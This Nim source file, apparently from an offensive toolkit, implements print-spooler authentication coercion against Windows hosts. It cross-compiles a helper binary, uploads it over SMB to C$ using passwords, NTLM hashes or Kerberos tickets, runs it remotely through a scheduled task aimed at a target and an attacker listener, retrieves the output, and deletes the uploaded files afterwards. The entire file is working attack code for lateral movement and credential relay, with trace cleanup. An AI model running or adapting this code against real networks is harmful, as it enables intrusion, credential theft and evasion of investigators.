import std/[asyncdispatch, asyncnet, os, osproc, random, strutils, times]

import ../smb/client as smb
import ./atexec
import ./transfer as smbtransfer

const spoolSource = staticRead("svc/nimuxspool.nim")
const crossFlags = " -d:mingw --cpu:i386 --os:windows -d:release --opt:size" &
                   " --cc:gcc --gcc.exe:i686-w64-mingw32-gcc" &
                   " --gcc.linkerexe:i686-w64-mingw32-gcc --passL:-static" &
                   " --mm:arc"

type
  SpoolCoerceResult* = object
    host*: string
    target*: string
    listener*: string
    authenticated*: bool
    binaryUploaded*: bool
    executed*: bool
    cleaned*: bool
    success*: bool
    message*: string
    error*: string
    remotePath*: string
    output*: string

proc randomToken(): string =
  var rng = initRand(int(getTime().toUnix()) xor cast[int](addr result))
  for _ in 0 ..< 10:
    let c = rng.rand(35)
    if c < 10: result.add chr(ord('0') + c)
    else: result.add chr(ord('a') + (c - 10))

proc quoteWinArg(s: string): string =
  result = "\""
  for c in s:
    if c == '"': result.add "\\\""
    else: result.add c
  result.add "\""

proc buildSpoolBinary*(): string =
  let tmp = getTempDir() / "nimux_spool_build_" & $getCurrentProcessId()
  createDir(tmp)
  try:
    let src = tmp / "nimux_spool.nim"
    writeFile(src, spoolSource)
    let exe = tmp / "nimux_spool.exe"
    let cmd = "nim --skipParentCfg:on c" & crossFlags & " --app:console" &
              " --nimcache:" & tmp / "cache" &
              " -o:" & exe & " " & src
    let (output, code) = execCmdEx(cmd)
    if code != 0:
      raise newException(IOError, "spool helper compile failed:\n" & output)
    result = readFile(exe)
  finally:
    removeDir(tmp)

proc pollRemoteOutput(host: string; port, timeoutMs: int;
                      username, password, ntlmHash, domain, remotePath: string;
                      authMethod: smb.SmbAuthMethod; ccache, krb5Config: string): Future[string] {.async.} =
  let credential = smb.SmbCredential(
    username: username, password: password,
    ntlmHash: ntlmHash, domain: domain, ccache: ccache, krb5Config: krb5Config)
  let session = await smb.establishSmbSession(host, port, max(timeoutMs, 8000),
    credential, authMethod)
  if session == nil or not session.authenticated:
    return ""
  let treeId = await smb.connectShareTree(session, "C$")
  if treeId == 0:
    try: asyncnet.close(session.ctx.socket) except CatchableError: discard
    return ""
  let stopAt = epochTime() + float(max(timeoutMs div 1000, 8))
  while epochTime() < stopAt:
    result = await smbtransfer.readFileIntoMemory(session, treeId, remotePath)
    if result.len > 0:
      break
    await sleepAsync(500)
  try: asyncnet.close(session.ctx.socket)
  except CatchableError: discard

proc deleteRemoteFiles(host: string; port, timeoutMs: int;
                       username, password, ntlmHash, domain: string;
                       paths: seq[string];
                       authMethod: smb.SmbAuthMethod; ccache, krb5Config: string): Future[bool] {.async.} =
  let credential = smb.SmbCredential(
    username: username, password: password,
    ntlmHash: ntlmHash, domain: domain, ccache: ccache, krb5Config: krb5Config)
  let session = await smb.establishSmbSession(host, port, max(timeoutMs, 5000),
    credential, authMethod)
  if session == nil or not session.authenticated:
    return false
  let treeId = await smb.connectShareTree(session, "C$")
  if treeId == 0:
    try: asyncnet.close(session.ctx.socket) except CatchableError: discard
    return false
  for p in paths:
    try:
      let r = await smbtransfer.deleteFileOnTree(session, treeId, "C$", p)
      result = result or r.success
    except CatchableError:
      discard
  try: asyncnet.close(session.ctx.socket)
  except CatchableError: discard

proc coerceViaRemoteTask*(host: string; port, timeoutMs: int;
                          username, password, ntlmHash, domain: string;
                          target, listener: string;
                          authMethod = smb.samNtlm; ccache = "";
                          krb5Config = ""): Future[SpoolCoerceResult] {.async.} =
  result.host = host
  result.target = target
  result.listener = listener
  let token = randomToken()
  let remoteName = "spool" & token & ".exe"
  let remotePath = "ProgramData\\" & remoteName
  let remoteWin = "C:\\ProgramData\\" & remoteName
  let remoteOutPath = remotePath & ".out"
  let remoteOutWin = remoteWin & ".out"
  result.remotePath = remoteWin

  var exeBytes: string
  try:
    exeBytes = buildSpoolBinary()
  except CatchableError as e:
    result.message = e.msg.splitLines()[0]
    result.error = e.msg
    return

  let localExe = getTempDir() / ("nimux_spool_upload_" & token & ".exe")
  try:
    writeFile(localExe, exeBytes)
    let upload = await smbtransfer.putFile(host, port, max(timeoutMs, 8000),
      username, password, ntlmHash, domain, "C$", remotePath, localExe, nil,
      authMethod, ccache, krb5Config)
    result.authenticated = upload.authenticated
    if not upload.success:
      result.message = if upload.error.len > 0: upload.error else: upload.message
      result.error = result.message
      return
    result.binaryUploaded = true

    let cmd = remoteWin & " " & quoteWinArg(target) & " " &
      quoteWinArg(listener) & " " & quoteWinArg(remoteOutWin)
    let exec = await atExec(host, port, max(timeoutMs, 15000),
      username, password, ntlmHash, domain, cmd, authMethod, ccache,
      krb5Config = krb5Config,
      outputPreDelayMs = 0)
    result.authenticated = exec.authenticated
    result.executed = exec.success
    if not exec.success:
      result.message = if exec.error.len > 0: exec.error else: exec.message
      result.error = result.message
      return

    result.output = await pollRemoteOutput(host, port, max(timeoutMs, 15000),
      username, password, ntlmHash, domain, remoteOutPath,
      authMethod, ccache, krb5Config)
    if result.output.len == 0:
      result.output = exec.output
    let outLower = result.output.toLowerAscii()
    result.success = outLower.contains("coerce triggered") or outLower.contains("notify failed")
    result.message =
      if result.output.strip().len > 0: result.output.strip()
      elif result.success: "coerce helper ran"
      else: "coerce helper produced no output"
  finally:
    try: removeFile(localExe) except CatchableError: discard
    if result.binaryUploaded:
      try:
        result.cleaned = await deleteRemoteFiles(host, port, max(timeoutMs, 8000),
          username, password, ntlmHash, domain,
          @[remotePath, remoteOutPath], authMethod, ccache, krb5Config)
      except CatchableError:
        discard
